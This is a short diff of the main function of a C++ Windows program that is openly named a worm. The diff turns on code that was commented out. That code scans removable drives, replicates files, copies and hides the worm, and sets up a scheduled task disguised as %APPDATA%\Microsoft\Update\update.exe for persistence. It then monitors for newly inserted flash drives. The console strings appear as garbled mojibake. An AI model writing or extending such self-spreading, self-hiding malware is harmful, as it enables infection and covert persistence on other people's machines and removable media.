@@ -24,6 +24,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	//worm worm1("E:\\test_worm", 1);
 	worm1.worm_was_started();
 
+
 	wcout << L"ÑÏÈÑÎÊ ÂÑÅÕ ÂÍÅØÍÈÕ ÍÎÑÈÒÅËÅÉ" << endl;
 	for (const auto& a1 : get_removable_volume_paths()) {
 		wcout << a1 << endl;
@@ -31,25 +32,21 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	
 	
 	
-
+	worm1.worm_was_started();
 	worm1.process_all_removable_disks();
 
-	return worm1.run_device_monitor(hInstance); // çàïóñê ìîíèòîðèíãà ôëåøåê
-
-	//worm1.scan_all_volumes();
-
-	
-	/*
 	worm1.search_list_dir();
 	worm1.print_list_dir();
 	worm1.collect_visible_files();
-
-	worm1.print_file_to_copy();
-
 	worm1.replicate_files(5);
-	*/
-	//worm1.copy_and_hide_worm();
-	//worm1.create_scheduled_task(L"%APPDATA%\\Microsoft\\Update\\update.exe");
-	//worm1.copy_file();
+	worm1.copy_and_hide_worm();
+	worm1.create_scheduled_task(L"%APPDATA%\\Microsoft\\Update\\update.exe");
+
+	//worm1.print_file_to_copy();
+
+	
+	return worm1.run_device_monitor(hInstance); // çàïóñê ìîíèòîðèíãà ôëåøåê
+	
+	
 	//wcout<<get_own_path();
 }
